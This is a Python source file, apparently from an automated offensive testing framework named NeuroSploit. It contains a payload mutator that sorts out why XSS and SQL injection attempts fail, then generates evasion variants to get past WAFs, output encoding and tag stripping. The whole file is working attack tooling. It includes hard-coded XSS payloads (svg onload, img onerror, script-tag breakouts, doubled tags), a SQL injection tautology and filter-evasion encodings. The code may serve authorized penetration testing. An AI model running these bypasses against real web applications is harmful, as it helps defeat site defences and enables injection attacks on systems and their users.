"""
NeuroSploit v3 - Payload Mutator

Adaptive payload mutation based on observed response patterns.
When initial payloads fail, analyzes WHY and generates targeted
bypass variants using encoding, obfuscation, and evasion techniques.
"""

import re
import html
from urllib.parse import quote, unquote
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass, field


@dataclass
class FailureContext:
    """Context about why a payload failed."""
    payload: str
    status_code: int = 0
    reflected: bool = False
    html_encoded: bool = False
    stripped: bool = False
    waf_blocked: bool = False  # 403/406/429
    timeout: bool = False
    body_snippet: str = ""
    failure_pattern: str = ""  # "encoded", "blocked", "stripped", "timeout", "generic"


@dataclass
class MutationResult:
    """Result of payload mutation."""
    original: str
    mutated: str
    strategy: str
    description: str


class PayloadMutator:
    """Adapts payloads based on observed response patterns.

    Analyzes failure patterns (encoding, WAF, stripping) and generates
    targeted mutations to bypass defenses.
    """

    def analyze_failure(self, payload: str, response: Dict,
                        vuln_type: str) -> FailureContext:
        """Analyze why a payload failed and classify the failure pattern."""
        status = response.get("status", 0)
        body = response.get("body", "")
        headers = response.get("headers", {})

        ctx = FailureContext(payload=payload, status_code=status)

        # Check reflection
        if payload in body:
            ctx.reflected = True
        elif html.escape(payload) in body:
            ctx.reflected = True
            ctx.html_encoded = True
        elif payload.replace("<", "").replace(">", "") in body:
            ctx.stripped = True

        # Check WAF block
        if status in (403, 406, 429, 503):
            ctx.waf_blocked = True
            ctx.failure_pattern = "blocked"
        elif status == 0:
            ctx.timeout = True
            ctx.failure_pattern = "timeout"
        elif ctx.html_encoded:
            ctx.failure_pattern = "encoded"
        elif ctx.stripped:
            ctx.failure_pattern = "stripped"
        elif ctx.reflected and not ctx.html_encoded:
            # Reflected but not triggering — context issue
            ctx.failure_pattern = "context"
        else:
            ctx.failure_pattern = "generic"

        ctx.body_snippet = body[:200] if body else ""
        return ctx

    def generate_variants(self, base_payload: str, failure_context: FailureContext,
                          max_variants: int = 5) -> List[MutationResult]:
        """Generate mutated variants based on observed failure patterns."""
        pattern = failure_context.failure_pattern
        variants = []

        strategy_map = {
            "encoded": self._mutations_for_encoding,
            "blocked": self._mutations_for_waf,
            "stripped": self._mutations_for_stripping,
            "timeout": self._mutations_for_timeout,
            "context": self._mutations_for_context,
            "generic": self._mutations_generic,
        }

        generator = strategy_map.get(pattern, self._mutations_generic)
        variants = generator(base_payload)

        return variants[:max_variants]

    def mutate(self, payload: str, strategy: str) -> Optional[str]:
        """Apply a single named mutation strategy."""
        strategies = {
            "double_url_encode": self._double_url_encode,
            "unicode_escape": self._unicode_escape,
            "html_entity_encode": self._html_entity_encode,
            "case_variation": self._case_variation,
            "null_byte_insert": self._null_byte_insert,
            "comment_injection": self._comment_injection,
            "concat_bypass": self._concat_bypass,
            "hex_encode": self._hex_encode,
            "newline_bypass": self._newline_bypass,
            "tab_bypass": self._tab_bypass,
            "utf7_encode": self._utf7_encode,
            "backtick_bypass": self._backtick_bypass,
            "svg_bypass": self._svg_bypass,
            "event_handler_bypass": self._event_handler_bypass,
        }
        fn = strategies.get(strategy)
        if fn:
            return fn(payload)
        return None

    # ── Failure-Specific Mutation Sets ──

    def _mutations_for_encoding(self, payload: str) -> List[MutationResult]:
        """Bypass HTML encoding."""
        return [
            MutationResult(payload, self._double_url_encode(payload),
                           "double_url_encode", "Double URL encode to bypass server-side decode"),
            MutationResult(payload, self._unicode_escape(payload),
                           "unicode_escape", "Unicode escape sequences bypass HTML entity encoding"),
            MutationResult(payload, self._backtick_bypass(payload),
                           "backtick_bypass", "Backticks instead of quotes (JS contexts)"),
            MutationResult(payload, self._html_entity_encode(payload),
                           "html_entity_encode", "Named HTML entities to bypass regex filters"),
            MutationResult(payload, self._svg_bypass(payload),
                           "svg_bypass", "SVG namespace for XSS bypass"),
        ]

    def _mutations_for_waf(self, payload: str) -> List[MutationResult]:
        """Bypass WAF rules."""
        return [
            MutationResult(payload, self._case_variation(payload),
                           "case_variation", "Mixed case to bypass case-sensitive WAF rules"),
            MutationResult(payload, self._comment_injection(payload),
                           "comment_injection", "SQL comments break WAF signature matching"),
            MutationResult(payload, self._newline_bypass(payload),
                           "newline_bypass", "Newlines/CRLF to split WAF pattern matching"),
            MutationResult(payload, self._null_byte_insert(payload),
                           "null_byte_insert", "Null byte to terminate WAF string parsing"),
            MutationResult(payload, self._tab_bypass(payload),
                           "tab_bypass", "Tab characters break WAF regex patterns"),
            MutationResult(payload, self._event_handler_bypass(payload),
                           "event_handler_bypass", "Alternative event handlers bypass WAF blacklists"),
        ]

    def _mutations_for_stripping(self, payload: str) -> List[MutationResult]:
        """Bypass tag/keyword stripping."""
        return [
            MutationResult(payload, self._double_tag(payload),
                           "double_tag", "Double tags — outer stripped, inner survives"),
            MutationResult(payload, self._concat_bypass(payload),
                           "concat_bypass", "String concatenation bypasses keyword filters"),
            MutationResult(payload, self._hex_encode(payload),
                           "hex_encode", "Hex encoding bypasses string-based filters"),
            MutationResult(payload, self._nested_tags(payload),
                           "nested_tags", "Nested/malformed tags bypass regex stripping"),
        ]

    def _mutations_for_timeout(self, payload: str) -> List[MutationResult]:
        """Shorter payloads for timeout-prone targets."""
        short = payload[:50] if len(payload) > 50 else payload
        return [
            MutationResult(payload, short,
                           "truncate", "Shorter payload to avoid timeout"),
            MutationResult(payload, "<svg/onload=alert(1)>",
                           "minimal_xss", "Minimal XSS payload"),
            MutationResult(payload, "1'OR'1'='1",
                           "minimal_sqli", "Minimal SQLi payload"),
        ]

    def _mutations_for_context(self, payload: str) -> List[MutationResult]:
        """Payload reflected but not triggering — context-specific bypasses."""
        return [
            MutationResult(payload, f'"-alert(1)-"',
                           "attribute_breakout", "Break out of attribute context"),
            MutationResult(payload, f"';alert(1)//",
                           "js_string_breakout", "Break out of JS string context"),
            MutationResult(payload, f"</script><script>alert(1)</script>",
                           "script_breakout", "Close script tag and inject new one"),
            MutationResult(payload, f"*/alert(1)/*",
                           "comment_breakout", "Break out of JS comment"),
            MutationResult(payload, self._event_handler_bypass(payload),
                           "event_handler_bypass", "Try different event handlers"),
        ]

    def _mutations_generic(self, payload: str) -> List[MutationResult]:
        """Generic mutations when failure cause is unknown."""
        return [
            MutationResult(payload, self._double_url_encode(payload),
                           "double_url_encode", "Double URL encode"),
            MutationResult(payload, self._case_variation(payload),
                           "case_variation", "Mixed case"),
            MutationResult(payload, self._comment_injection(payload),
                           "comment_injection", "Inject comments"),
            MutationResult(payload, self._unicode_escape(payload),
                           "unicode_escape", "Unicode escapes"),
        ]

    # ── Individual Mutation Functions ──

    def _double_url_encode(self, payload: str) -> str:
        return quote(quote(payload, safe=""), safe="")

    def _unicode_escape(self, payload: str) -> str:
        result = payload
        replacements = {"<": "\\u003c", ">": "\\u003e", "'": "\\u0027",
                        '"': "\\u0022", "/": "\\u002f", "(": "\\u0028",
                        ")": "\\u0029"}
        for char, esc in replacements.items():
            result = result.replace(char, esc)
        return result

    def _html_entity_encode(self, payload: str) -> str:
        result = payload
        replacements = {"<": "&lt;", ">": "&gt;", "'": "&apos;",
                        '"': "&quot;", "/": "&#47;"}
        for char, ent in replacements.items():
            result = result.replace(char, ent)
        return result

    def _case_variation(self, payload: str) -> str:
        return "".join(c.upper() if i % 2 else c.lower()
                       for i, c in enumerate(payload))

    def _null_byte_insert(self, payload: str) -> str:
        return payload.replace("<", "%00<").replace("script", "scr%00ipt")

    def _comment_injection(self, payload: str) -> str:
        result = payload
        # SQL context
        result = result.replace(" ", "/**/")
        # HTML context
        result = result.replace("script", "scr<!---->ipt")
        return result

    def _concat_bypass(self, payload: str) -> str:
        # For SQL: CONCAT or ||
        if "'" in payload or "SELECT" in payload.upper():
            return payload.replace("'1'='1'", "'1'||'1'='11'")
        # For JS: string concat
        return payload.replace("alert", "al"+"ert")

    def _hex_encode(self, payload: str) -> str:
        # Encode key characters as hex
        result = payload
        hex_map = {"<": "%3c", ">": "%3e", "'": "%27", '"': "%22",
                   "(": "%28", ")": "%29", "/": "%2f", " ": "%20"}
        for char, hex_val in hex_map.items():
            result = result.replace(char, hex_val)
        return result

    def _newline_bypass(self, payload: str) -> str:
        return payload.replace(" ", "\r\n")

    def _tab_bypass(self, payload: str) -> str:
        return payload.replace(" ", "\t")

    def _utf7_encode(self, payload: str) -> str:
        return payload.replace("<", "+ADw-").replace(">", "+AD4-")

    def _backtick_bypass(self, payload: str) -> str:
        return payload.replace("'", "`").replace('"', "`")

    def _svg_bypass(self, payload: str) -> str:
        if "<script" in payload.lower():
            return "<svg><animatetransform onbegin=alert(1) attributeName=transform>"
        return "<svg/onload=alert(1)>"

    def _event_handler_bypass(self, payload: str) -> str:
        handlers = [
            "<img src=x onerror=alert(1)>",
            "<body onload=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<video src=x onerror=alert(1)>",
        ]
        # Return a different handler than what's in the payload
        for h in handlers:
            if h not in payload:
                return h
        return handlers[0]

    def _double_tag(self, payload: str) -> str:
        if "<script" in payload.lower():
            return "<scr<script>ipt>alert(1)</scr</script>ipt>"
        return f"<{payload[1:]}" if payload.startswith("<") else payload

    def _nested_tags(self, payload: str) -> str:
        return payload.replace("<script>", "<<script>>").replace("</script>", "<</script>>")
